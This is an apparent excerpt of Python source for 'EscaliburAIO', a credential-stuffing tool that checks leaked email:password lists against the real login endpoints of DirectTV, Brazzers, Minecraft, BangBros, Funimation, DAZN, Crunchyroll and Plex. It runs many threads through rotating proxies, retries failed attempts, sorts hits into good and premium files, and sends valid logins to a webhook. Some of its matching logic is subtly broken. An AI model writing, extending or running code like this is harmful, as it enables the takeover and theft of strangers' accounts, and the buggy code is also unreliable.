        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Spotify"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Valorant_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def Disney():
        print("This option is off..")
        time.sleep(2)
        menu()
    def DirectTV():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="DirectTV"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=DirectTV_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def DirectTV_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                content = f"_dyncharset=UTF-8&_dynSessConf=100695874470150304&isTguardAuthEnabled=true&nflRushHourEnabled=false&loginPage=https%3A%2F%2Fwww.directv.com%2FDTVAPP%2Flogin%2Flogin.jsp&targetURL=https%3A%2F%2Fcprodx.att.com%2FTokenService%2FnxsATS%2FWATokenService%3FisPassive%3Dtrue%26appID%3Dm93639%26returnURL%3Dhttps%253A%252F%252Fwww.directv.com%252FDTVAPP%252Fauth.jsp%253Fremember%253Dfalse&returnErrorCode=true&loginURL=https%3A%2F%2Fwww.directv.com%2FDTVAPP%2Fauth.jsp%3Fremember%3Dfalse&%2Fatg%2Fuserprofiling%2FProfileFormHandler.landingPageUrl=&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.landingPageUrl=+&%2Fatg%2Fuserprofiling%2FProfileFormHandler.userLoginSuccessUrl=%2FDTVAPP%2Fmydirectv%2Faccount%2FmyOverview.jsp&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.userLoginSuccessUrl=+&%2Fatg%2Fuserprofiling%2FProfileFormHandler.userLoginErrorUrl=%2FDTVAPP%2Flogin%2Flogin.jsp&_D%3A%2Fatg%2Fuserprofiling%2FProfileFormHandler.userLoginErrorUrl=+&register=false&_D%3Aregister=+&userid={email}&password={password}&_D%3Aremember=+&register=false&_D%3Aregister=+&_DARGS=%2FDTVAPP%2Fglobal%2Fold%2FloginBox.jsp"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post("https://cprodmasx.att.com/commonLogin/igate_wam/login.do?_DARGS=/DTVAPP/global/old/loginBox.jsp", data=content, headers=headers)

                if "Please enter a valid password" or "\"termsandconditions\",\"width=618, height=485, resizable=yes, scrollbars=yes\")'>What's this?</a>" or "Here's your Access ID. It's the same as your DIRECTV ID. You'll keep your existing password." or "Looks like you signed in with your Yahoo ID. That ID doesn't work with" or "&response_code=E.01.03.015" or "&response_code=E.01.03.016" or "&response_code=E.01.03.050" or "&response_code=E.01.01.420" or "&response_code=E.01.01.410" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "<h1>Multiple Accounts Found</h1>" or "TATS-TokenID" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "403 ERROR" or "Proxy Authorization Required" or "proxy node error" or "Please login to browse the internet" or "400 Bad Request" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                else:
                    threading.Thread(target=DirectTV_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=DirectTV_check, args=(email,password, proxylist,)).start()
    # Shopping

    def eBay():
        print("This option is off..")
        time.sleep(2)
        menu()

    # Porn
    def Brazzers():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Brazzers"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Brazzers_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def Brazzers_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "content-type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                }
                content = ""

                f = sess.get("https://ma.brazzers.com/access/login/", headers=headers, data=content)

                url = "https://ma.brazzers.com/access/submit/"
                content = f"username={email}&password={password}&g-recaptcha-response=6LeY4gsUAAAAANITYkv2gPI8eEu8am3TCOr4B6j7&rememberme=on" 

                headers = {
                    "content-type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache",
                    "referer":"https://ma.brazzers.com/access/login/", 
                    "origin":"https://ma.brazzers.com" 
                }
                r = sess.post(url, data=content, headers=headers)
                if ">Login Error</" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Fallback Procedure - Brazzers" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Please fill out the reCAPTCHA" in r.text:
                    threading.Thread(target=Brazzers_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Brazzers_check, args=(email,password, proxylist,)).start()
    def Chaturbate():
        print("This option is off..")
        time.sleep(2)
        menu()
    def RealityKings():
        print("This option is off..")
        time.sleep(2)
        menu()
    def Minecraft():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Minecraft"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Minecraft_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def Minecraft_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                request_body = json.dumps({
                    'agent': {
                        'name': 'Minecraft',
                        'version': 1    
                    },
                        'username': email,
                        'password': password})

                r = sess.post('https://authserver.mojang.com/authenticate', data= request_body)
                if "accessToken" in r.text:
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))

                    if "name" in r.text:
                        name = r.json()["availableProfiles"][0]["name"]
                        good+=1
                        cpm+=1
                        checked+=1
                        open("results/{}/premium.txt".format(today), "a+").write("{}:{} | name: {}\n".format(email, password, name))

                    else:
                        good+=1
                        cpm+=1
                        checked+=1
                        open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                elif "Invalid credentials. Invalid username or password." in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Minecraft_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Minecraft_check, args=(email,password, proxylist,)).start()
    def BangBros():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="BangBros"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=BangBros_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def BangBros_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "http://members.bangbros.com/login"

                headers = {
                "Content-Type":"application/x-www-form-urlencoded", 
                "Accept":"*/*",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                "Pragma":"no-cache" 
                }

                content = ""

                r = sess.get(url, data=content, headers=headers)
                csrf = search(r'login__token\" name=\"login[_token]\" value=\"(.*?)\" /></form>', str(r.text)).group(1)

                us = f"login%5Busername%5D={email}&login%5Bpassword%5D={password}&profiler_input=&login%5BioBB%5D%5BioBB%5D=&login%5B_token%5D={csrf}"

                head = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Cookies":"device_view: full", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }

                r = sess.post("http://members.bangbros.com/login_check", headers=head, data=content)
                if "No thanks, take me to the site" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Wrong username/password!" or "Login error has occured.  Please contact customer support" or "UNLOCK OUR ENTIRE LIBRARY OF WEBSITES." in  r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=BangBros_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=BangBros_check, args=(email,password, proxylist,)).start()
    def Propertysex():
        print("This option is off..")
        time.sleep(2)
        menu()
    # VPN

    def Funimation_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "content-type":"application/json", 
                    "Host":"prod-api-funimationnow.dadcdigital.com", 
                    "Content-Type":"application/json", 
                    "Connection":"keep-alive", 
                    "Accept":"*/*", 
                    "User-Agent":"Funimation/314 CFNetwork/1121.2.2 Darwin/19.3.0", 
                    "Content-Length":"58", 
                    "Accept-Language":"en-us", 
                    "Accept-Encoding":"gzip, deflate, br" 
                }

                content = {"email":email,"password":password}

                r = sess.post("https://prod-api-funimationnow.dadcdigital.com/api/auth/login/" ,data=content, headers=headers)

                if"{\"token\":\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/premium.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Request unsuccessful." in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "basic" or "free" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Funimation_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Funimation_check, args=(emails, passwords, proxylist,)).start()
    def Funimation():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Funimation"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Funimation_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def DAZN_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                content = {"Email":f"{email}","Password":f"{password}","DeviceId":"0049A8939B","Platform":"web"}

                headers = {
                    "Content-Type":"application/json",
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "origin":"https://www.dazn.com", 
                    "referer":"https://www.dazn.com/de-DE/account/signin", 
                    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36 OPR/62.0.3331.72" 
                }
                r = sess.post("https://isl-eu.dazn.com/misl/eu/v5/SignIn", headers=headers, json=content)

                if "{\"odata.error\":{\"code\":10049,\"message\":{\"lang\":\"en-US\",\"value\":\"InvalidPassword\"}}}" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "{\"Result\":\"SignedIn" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Request limiting policy has been breached"  in r.text:
                    banned+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=DAZN_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=DAZN_check, args=(email,password, proxylist,)).start()
    def DAZN():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="DAZN"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=DAZN_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1


    def Crunchyroll_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                content = "locale=enUS&device_id=2774e3b7-79ff-4555-b6f2-c69866198b83&device_type=com.crunchyroll.crunchyroid&access_token=WveH9VkPLrXvuNm&version=457" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "X-Android-Application-Version-Name":"2.6.0", 
                    "X-Android-Device-Manufacturer":"samsung", 
                    "X-Android-SDK":"22", 
                    "Using-Brightcove-Player":"1", 
                    "X-Android-Application-Version-Code":"457", 
                    "X-Android-Release":"5.1.1", 
                    "X-Android-Device-Product":"greatlteks", 
                    "X-Android-Device-Model":"SM-G960F", 
                    "X-Android-Device-Is-GoogleTV":"0", 
                    "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G960F Build/NMF26X)" 
                }

                f = sess.post("https://api.crunchyroll.com/start_session.1.json", headers=headers, data=content)

                token = search(r'\"session_id\"":"\"(.*?)\"', str(f.text)).group(1)

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "X-Android-Application-Version-Name":"2.6.0", 
                    "X-Android-Device-Manufacturer":"samsung", 
                    "X-Android-SDK":"22", 
                    "Using-Brightcove-Player":"1", 
                    "X-Android-Application-Version-Code":"457", 
                    "X-Android-Release":"5.1.1", 
                    "X-Android-Device-Product":"greatlteks", 
                    "X-Android-Device-Model":"SM-G960F", 
                    "X-Android-Device-Is-GoogleTV":"0", 
                    "User-Agent":"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G960F Build/NMF26X)" 
                }
                content = "account={}&password={}&locale=enUS&session_id={}".format(email, password, token)

                r = sess.post("https://api.crunchyroll.com/login.2.json", headers=headers, data=content)

                if "Incorrect login information." or "Your account has been locked." or "not found.\"}" or "internal_server_error" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "user\",\"user_id" in r.text:
                    plan = search(r'access_type\":\"(.*?)\"', str(r.text)).group(1)
                    subscribtion = search(r'premium\":\"(.*?)\"', str(r.text)).group(1)
                    banned+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/premium.txt".format(today), "a+").write("{}:{} | Plan: {} | Subscribtion: {} |\n".format(email, password, plan, subscribtion))
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "\"premium\":\"\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Crunchyroll_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Crunchyroll_check, args=(email,password, proxylist,)).start()
    def Crunchyroll():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="CrunchyRoll"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Crunchyroll_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def Plex_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                before, after = email.split("@")[0], email.split("@")[1]

                content = "login={}%40{}&password={}&rememberMe=true".format(before, after, password)

                headers = {
                    "Host":"plex.tv",
                    "Connection":"keep-alive",
                    "Accept":"application/json",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin":"https://app.plex.tv",
                    "Sec-Fetch-Site":"same-site",
                    "Sec-Fetch-Mode":"cors",
                    "Sec-Fetch-Dest":"empty",
                    "Referer":"https://app.plex.tv/",
                    "Accept-Language":"en-US,en;q=0.9",
                    "Cookie":"__cfduid=d59a57958944644196045ec9015db6d1b1591185445",
                    "Accept-Encoding":"gzip, deflate",
                    "Content-Length":"60"
                }

                url = "https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20SSO&X-Plex-Client-Identifier=50a7d2cc-858f-1639-7be3-b304ec0d5b6f"

                r = sess.post(url, data=content, headers=headers)
                if "User could not be authenticated" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "\"status\":\"Active\"" in r.text:
                    plan = search(r'\"plan\":\"(.*?)\",', str(r.text)).group(1)
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    open("results/{}/premium.txt".format(today), "a+").write("{}:{} | Plan: {}\n".format(email, password, plan))
                elif "active\":false" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Plex_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Plex_check, args=(email,password, proxylist,)).start()
    def Plex():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Plex"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Plex_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def XVPN_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",  
                    "Pragma":"no-cache",  
                    "Accept":"*/*",  
                    "authority":"xvpn.io",  
                    "method":"POST", 
                    "path":"/?n=best.free.xvpn.LoginAction", 
                    "scheme":"https",  
                    "origin":"https://xvpn.io",  
                    "referer":"https://xvpn.io/",  
                    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36",  
                    "x-requested-with":"XMLHttpRequest" 
                }
                content = "Username={}&Password={}".format(email, password) 
